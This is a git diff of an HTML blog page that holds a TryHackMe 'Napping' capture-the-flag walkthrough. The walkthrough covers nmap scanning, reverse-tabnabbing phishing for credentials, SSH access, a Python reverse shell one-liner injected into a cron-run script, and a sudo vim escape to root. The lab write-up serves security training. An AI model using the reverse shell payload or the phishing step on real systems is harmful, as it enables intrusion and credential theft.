+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.247.40
+</span></span><span class="line"><span class="cl">Host is up, received reset ttl 63 (0.24s latency).
+</span></span><span class="line"><span class="cl">Scanned at 2022-03-23 06:39:55 EDT for 13s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 85:f3:f5:b4:8c:24:1e:ef:6f:28:42:33:7c:2a:22:b4 (RSA)
+</span></span><span class="line"><span class="cl">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmgxcZKHEVEbLHxkmo/bjXYP9qMuWYGmbV0Tl/maOUcfyhPcPPcl2S/RzgKgfWR5MBUit4/iD+LBbKvIqv5NsXAMjUFaC35mXLRrEhUXSP4pfcaWGzKARRJ4C9eUHJ1aT/vhU0ZNnhOW1H8Ig+btzcIqeiQJiKH+iGySyTsXJ3qLOAcQ4qwGKfdpnPtN3MYG7Ba6etdN4J+FVm/tjcUxE76ZKv5IdN+iOeTwBhKhk8lTPf6G8S7X2jx38deqAI6j20UBAnlFdfSjVrbavfzoeyAKODpzmgQ0J/VFWIZGqqMxg/Hq6KChT67DTMxrnfN7wojS2/fItjIpsvjTxlxhiHSvi+57ngJlPYKbiqU4P1nbxSB+eyy0UK44ln6MbLpCcRkvwOP87VOvfII4TfXostq94fYRW8G7oszKGFrucQdYoVTFhKgYveKe0np4eGG/GdPefDbLp5VoNTjs7WBDSxn5jY+0A/IY1/EjuaGlQvpk5IxDbU/mYm9bPeSYdAWgk=
+</span></span><span class="line"><span class="cl">|   256 c2:7b:a9:0c:28:7c:d1💿03:23:f4:a8:bc:02:72:4b (ECDSA)
+</span></span><span class="line"><span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBP4j+pg12EElUiOMAVpEuqFCympfDuyyZ7McBGxU9lCp4qMOGKShc96y4656MSnAZu7ofMx9DyO1sDwcfbI3MQ=
+</span></span><span class="line"><span class="cl">|   256 fe:92:00:b4:ee:5e:5a:92:52:90:9f:5e:0b:fd:61:a3 (ED25519)
+</span></span><span class="line"><span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0X6D1WGTnXedsm4aFXKIEt6iY22msqmq2QvKPW3VXM
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl">| http-cookie-flags: 
+</span></span><span class="line"><span class="cl">|   /: 
+</span></span><span class="line"><span class="cl">|     PHPSESSID: 
+</span></span><span class="line"><span class="cl">|_      httponly flag not set
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Login
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
+</span></span></code></pre></div><p>So there are 2 ports running</p>
 <p>-&gt; <code>22</code> - <code>OpenSSH 8.2p1</code></p>
 <p>-&gt; <code>80</code>- <code>Apache httpd 2.4.41</code></p>
 <h2 id="website---port-80">Website - port 80<a hidden class="anchor" aria-hidden="true" href="#website---port-80">#</a></h2>
@@ -460,13 +472,13 @@ Reverse tabnabbing, or simply tabnabbing, is a <code>phishing attack</code> in w
 </ul>
 <p>Now all we have to do is to wait for 2-3 mins for the admin to fall in our trap! kekw</p>
 <p>After few mins I got requests from the server for both of the fake html pages I created which essentially means the admin did visit our fake login page!</p>
-<pre tabindex="0"><code>┌──(root💀kali)-[~/thm/napping]
-└─# python3 -m http.server 8000
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.10.194.37 - - [24/Mar/2022 04:13:54] &#34;GET /malicious.html HTTP/1.1&#34; 200 -
-10.10.194.37 - - [24/Mar/2022 04:13:54] &#34;GET /phishing.html HTTP/1.1&#34; 200 -
-10.10.194.37 - - [24/Mar/2022 04:13:55] code 501, message Unsupported method (&#39;POST&#39;)
-</code></pre><p>Interesting thing to see here is that there is a <strong>POST</strong> request sent back to us. Lets check wireshark for more information about that .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~/thm/napping]
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server 8000
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</span></span><span class="line"><span class="cl">10.10.194.37 - - [24/Mar/2022 04:13:54] &#34;GET /malicious.html HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">10.10.194.37 - - [24/Mar/2022 04:13:54] &#34;GET /phishing.html HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">10.10.194.37 - - [24/Mar/2022 04:13:55] code 501, message Unsupported method (&#39;POST&#39;)
+</span></span></code></pre></div><p>Interesting thing to see here is that there is a <strong>POST</strong> request sent back to us. Lets check wireshark for more information about that .</p>
 <p><img loading="lazy" src="img/website8.png#center" alt="website8"  />
 </p>
 <p><strong>Right click on the POST request</strong> and select <strong>Follow</strong> -&gt; <strong>TCP stream</strong></p>
@@ -474,45 +486,45 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 </p>
 <p>Yay  we got a username called <code>daniel</code> &amp; his password.</p>
 <p>Using the credentials I was able to SSH in to machine as daniel .</p>
-<pre tabindex="0"><code>┌──(root💀kali)-[~/thm/napping]
-└─# ssh daniel@10.10.194.37
-The authenticity of host &#39;10.10.194.37 (10.10.194.37)&#39; can&#39;t be established.
-ED25519 key fingerprint is SHA256:JofRko6/RC6xnBRFyh6aSMX+ospLetfcod6d05kXQQU.
-This key is not known by any other names
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &#39;10.10.194.37&#39; (ED25519) to the list of known hosts.
-daniel@10.10.194.37&#39;s password: 
-Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Thu 24 Mar 2022 05:50:13 AM UTC
-
-  System load:  0.0               Processes:             113
-  Usage of /:   56.9% of 8.90GB   Users logged in:       0
-  Memory usage: 60%               IPv4 address for eth0: 10.10.194.37
-  Swap usage:   0%
-10 updates can be applied immediately.
-To see these additional updates run: apt list --upgradable
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Wed Mar 16 00:41:48 2022 from 10.0.2.26
-
-daniel@napping:~$ id
-uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
-</code></pre><p>We are a part of <code>administrators</code> group</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~/thm/napping]
+</span></span><span class="line"><span class="cl">└─# ssh daniel@10.10.194.37
+</span></span><span class="line"><span class="cl">The authenticity of host &#39;10.10.194.37 (10.10.194.37)&#39; can&#39;t be established.
+</span></span><span class="line"><span class="cl">ED25519 key fingerprint is SHA256:JofRko6/RC6xnBRFyh6aSMX+ospLetfcod6d05kXQQU.
+</span></span><span class="line"><span class="cl">This key is not known by any other names
+</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;10.10.194.37&#39; (ED25519) to the list of known hosts.
+</span></span><span class="line"><span class="cl">daniel@10.10.194.37&#39;s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Thu 24 Mar 2022 05:50:13 AM UTC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             113
+</span></span><span class="line"><span class="cl">  Usage of /:   56.9% of 8.90GB   Users logged in:       0
+</span></span><span class="line"><span class="cl">  Memory usage: 60%               IPv4 address for eth0: 10.10.194.37
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">10 updates can be applied immediately.
+</span></span><span class="line"><span class="cl">To see these additional updates run: apt list --upgradable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
+</span></span><span class="line"><span class="cl">To check for new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Wed Mar 16 00:41:48 2022 from 10.0.2.26
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">daniel@napping:~$ id
+</span></span><span class="line"><span class="cl">uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
+</span></span></code></pre></div><p>We are a part of <code>administrators</code> group</p>
 <p>There are 3 users on the machine <code>root</code>, <code>daniel</code> &amp; <code>adrian</code></p>
 <h1 id="shell-as-adrian">Shell as adrian<a hidden class="anchor" aria-hidden="true" href="#shell-as-adrian">#</a></h1>
-<pre tabindex="0"><code>daniel@napping:/home/adrian$ cat /etc/passwd | grep bash
-
-root❌0:0:root:/root:/bin/bash
-adrian❌1000:1000:adrian:/home/adrian:/bin/bash
-daniel❌1001:1001::/home/daniel:/bin/bash
-</code></pre><p>We need to escalate our privileges to adrian to get the user flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">daniel@napping:/home/adrian$ cat /etc/passwd | grep bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">adrian❌1000:1000:adrian:/home/adrian:/bin/bash
+</span></span><span class="line"><span class="cl">daniel❌1001:1001::/home/daniel:/bin/bash
+</span></span></code></pre></div><p>We need to escalate our privileges to adrian to get the user flag.</p>
 <p>Poking around the machine I found <code>config.php</code> at <code>/var/www/html</code> which had username &amp; a password</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">daniel</span><span class="o">@</span><span class="nx">napping</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">config</span><span class="o">.</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
@@ -527,24 +539,24 @@ daniel❌1001:1001::/home/daniel:/bin/bash
 </span></span><span class="line"><span class="cl"><span class="o">.</span>
 </span></span></code></pre></div><p>With the help of these credentials I was able to login to mysql@localhost but found nothing quite interesting there.</p>
 <p>Visiting the home dir of adrian,</p>
-<pre tabindex="0"><code>daniel@napping:/home/adrian$ ls -al
-total 44
-drwxr-xr-x 4 adrian adrian         4096 Mar 24 06:00 .
-drwxr-xr-x 4 root   root           4096 Mar 15 23:28 ..
-lrwxrwxrwx 1 root   root              9 Mar 16 00:39 .bash_history -&gt; /dev/null
--rw-r--r-- 1 adrian adrian          220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 adrian adrian         3771 Feb 25  2020 .bashrc
-drwx------ 2 adrian adrian         4096 Mar 15 23:28 .cache
-lrwxrwxrwx 1 root   root              9 Mar 16 00:40 .mysql_history -&gt; /dev/null
--rw-r--r-- 1 adrian adrian          807 Feb 25  2020 .profile
--rw-rw-r-- 1 adrian administrators  480 Mar 16 00:02 query.py
--rw-rw-r-- 1 adrian adrian           75 Mar 16 00:38 .selected_editor
--rw-rw-r-- 1 adrian adrian          224 Mar 24 06:06 site_status.txt
-drwx------ 2 adrian adrian         4096 Mar 15 23:27 .ssh
--rw-r--r-- 1 adrian adrian            0 Mar 15 23:28 .sudo_as_admin_successful
--rw-r----- 1 root   adrian           56 Mar 16 00:33 user.txt
--rw------- 1 adrian adrian            0 Mar 16 00:40 .viminfo
-</code></pre><p>We have the user.txt her. We can view and edit the <code>query.py</code> file since we are a part of administrators group.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">daniel@napping:/home/adrian$ ls -al
+</span></span><span class="line"><span class="cl">total 44
+</span></span><span class="line"><span class="cl">drwxr-xr-x 4 adrian adrian         4096 Mar 24 06:00 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 4 root   root           4096 Mar 15 23:28 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root   root              9 Mar 16 00:39 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 adrian adrian          220 Feb 25  2020 .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 adrian adrian         3771 Feb 25  2020 .bashrc
+</span></span><span class="line"><span class="cl">drwx------ 2 adrian adrian         4096 Mar 15 23:28 .cache
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root   root              9 Mar 16 00:40 .mysql_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 adrian adrian          807 Feb 25  2020 .profile
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 adrian administrators  480 Mar 16 00:02 query.py
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 adrian adrian           75 Mar 16 00:38 .selected_editor
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 adrian adrian          224 Mar 24 06:06 site_status.txt
+</span></span><span class="line"><span class="cl">drwx------ 2 adrian adrian         4096 Mar 15 23:27 .ssh
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 adrian adrian            0 Mar 15 23:28 .sudo_as_admin_successful
+</span></span><span class="line"><span class="cl">-rw-r----- 1 root   adrian           56 Mar 16 00:33 user.txt
+</span></span><span class="line"><span class="cl">-rw------- 1 adrian adrian            0 Mar 16 00:40 .viminfo
+</span></span></code></pre></div><p>We have the user.txt her. We can view and edit the <code>query.py</code> file since we are a part of administrators group.</p>
 <p><em>osquery.py</em></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
@@ -568,72 +580,72 @@ drwx------ 2 adrian adrian         4096 Mar 15 23:27 .ssh
 </span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span></span></code></pre></div><p>The <code>site_status.txt</code> file hints that this script might be running in the background every  minute.</p>
 <p><em>site_status.txt</em></p>
-<pre tabindex="0"><code>daniel@napping:/home/adrian$ cat site_status.txt
-Site is Up: 24/03/2022 06:31:01
-Site is Up: 24/03/2022 06:32:02
-Site is Up: 24/03/2022 06:33:01
-Site is Up: 24/03/2022 06:34:02
-Site is Up: 24/03/2022 06:35:01
-Site is Up: 24/03/2022 06:36:02
-Site is Up: 24/03/2022 06:37:01
-Site is Up: 24/03/2022 06:38:02
-Site is Up: 24/03/2022 06:39:01
-</code></pre><p>Lets add a python reverse shell oneliner at the end of the <strong>osquery.py</strong> script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">daniel@napping:/home/adrian$ cat site_status.txt
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:31:01
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:32:02
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:33:01
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:34:02
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:35:01
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:36:02
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:37:01
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:38:02
+</span></span><span class="line"><span class="cl">Site is Up: 24/03/2022 06:39:01
+</span></span></code></pre></div><p>Lets add a python reverse shell oneliner at the end of the <strong>osquery.py</strong> script.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;ip&#34;</span><span class="p">,</span><span class="mi">9001</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&#34;bash&#34;</span><span class="p">)</span>
 </span></span></code></pre></div><h2 id="usertxt-">user.txt 🚩<a hidden class="anchor" aria-hidden="true" href="#usertxt-">#</a></h2>
 <p>After a minute we got a reverse shell back as <strong>adrian</strong>. Go ahead and grab the <code>user.txt</code> 🚩</p>
-<pre tabindex="0"><code>┌──(root💀kali)-[/opt/peas]
-└─# nc -lvnp 9001                                                                  127 ⨯
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::9001
-Ncat: Listening on 0.0.0.0:9001
-
-
-Ncat: Connection from 10.10.35.41.
-Ncat: Connection from 10.10.35.41:46982.
-
-adrian@napping:~$ id
-uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators)
-
-adrian@napping:~$ cat user.txt
-THM{Wh@T_1S_*******PriViL36E}
-</code></pre><h1 id="shell-as-root">Shell as root<a hidden class="anchor" aria-hidden="true" href="#shell-as-root">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[/opt/peas]
+</span></span><span class="line"><span class="cl">└─# nc -lvnp 9001                                                                  127 ⨯
+</span></span><span class="line"><span class="cl">Ncat: Version 7.92 ( https://nmap.org/ncat )
+</span></span><span class="line"><span class="cl">Ncat: Listening on :::9001
+</span></span><span class="line"><span class="cl">Ncat: Listening on 0.0.0.0:9001
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Ncat: Connection from 10.10.35.41.
+</span></span><span class="line"><span class="cl">Ncat: Connection from 10.10.35.41:46982.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">adrian@napping:~$ id
+</span></span><span class="line"><span class="cl">uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">adrian@napping:~$ cat user.txt
+</span></span><span class="line"><span class="cl">THM{Wh@T_1S_*******PriViL36E}
+</span></span></code></pre></div><h1 id="shell-as-root">Shell as root<a hidden class="anchor" aria-hidden="true" href="#shell-as-root">#</a></h1>
 <p>Running <code>sudo -l</code> reveals that we could run <code>vim</code> as root.</p>
-<pre tabindex="0"><code>adrian@napping:~$ sudo -l
-
-Matching Defaults entries for adrian on napping:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User adrian may run the following commands on napping:
-    (root) NOPASSWD: /usr/bin/vim
-</code></pre><h2 id="roottxt-">root.txt 🚩<a hidden class="anchor" aria-hidden="true" href="#roottxt-">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">adrian@napping:~$ sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries for adrian on napping:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User adrian may run the following commands on napping:
+</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/bin/vim
+</span></span></code></pre></div><h2 id="roottxt-">root.txt 🚩<a hidden class="anchor" aria-hidden="true" href="#roottxt-">#</a></h2>
 <p>We refer <a href="https://gtfobins.github.io/gtfobins/vim/#shell">GTFOBINS</a> to check sudo entry for vim.</p>
 <p>Run <code>sudo /usr/bin/vim -c ':!/bin/sh'</code> to obtain root shell .
 Grab the <code>root.txt</code> flag 🎉</p>
-<pre tabindex="0"><code># id
-uid=0(root) gid=0(root) groups=0(root)
-
-# cat /root/root.txt
-THM{Adm1n$__******tsk_tSK}
-</code></pre>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># cat /root/root.txt
+</span></span><span class="line"><span class="cl">THM{Adm1n$__******tsk_tSK}
+</span></span></code></pre></div>
 
   </div>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/tabnabbing/">tabnabbing</a></li>
-      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/vim/">vim</a></li>
-      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/phishing/">phishing</a></li>
-      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/misconfiguration/">misconfiguration</a></li>
+      <li><a href="https://sh3bu.github.io/tags/tabnabbing/">tabnabbing</a></li>
+      <li><a href="https://sh3bu.github.io/tags/vim/">vim</a></li>
+      <li><a href="https://sh3bu.github.io/tags/phishing/">phishing</a></li>
+      <li><a href="https://sh3bu.github.io/tags/misconfiguration/">misconfiguration</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/kiba/kiba/">
+  <a class="prev" href="https://sh3bu.github.io/posts/kiba/">
     <span class="title">« Prev</span>
     <br>
     <span>Kiba - THM</span>
   </a>
-  <a class="next" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/gitandcrumpets/">
+  <a class="next" href="https://sh3bu.github.io/posts/gitandcrumpets/">
     <span class="title">Next »</span>
     <br>
     <span>GitandCrumpets - THM</span>
@@ -643,42 +655,42 @@ THM{Adm1n$__******tsk_tSK}
 
 <div class="share-buttons">
     <a target="_blank" rel="noopener noreferrer" aria-label="share Napping - THM on twitter"
-        href="https://twitter.com/intent/tweet/?text=Napping%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fnapping%2f&amp;hashtags=tabnabbing%2cvim%2cphishing%2cmisconfiguration">
+        href="https://twitter.com/intent/tweet/?text=Napping%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fposts%2fnapping%2f&amp;hashtags=tabnabbing%2cvim%2cphishing%2cmisconfiguration">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Napping - THM on linkedin"
-        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fnapping%2f&amp;title=Napping%20-%20THM&amp;summary=Napping%20-%20THM&amp;source=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fnapping%2f">
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsh3bu.github.io%2fposts%2fnapping%2f&amp;title=Napping%20-%20THM&amp;summary=Napping%20-%20THM&amp;source=https%3a%2f%2fsh3bu.github.io%2fposts%2fnapping%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Napping - THM on reddit"
-        href="https://reddit.com/submit?url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fnapping%2f&title=Napping%20-%20THM">
+        href="https://reddit.com/submit?url=https%3a%2f%2fsh3bu.github.io%2fposts%2fnapping%2f&title=Napping%20-%20THM">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
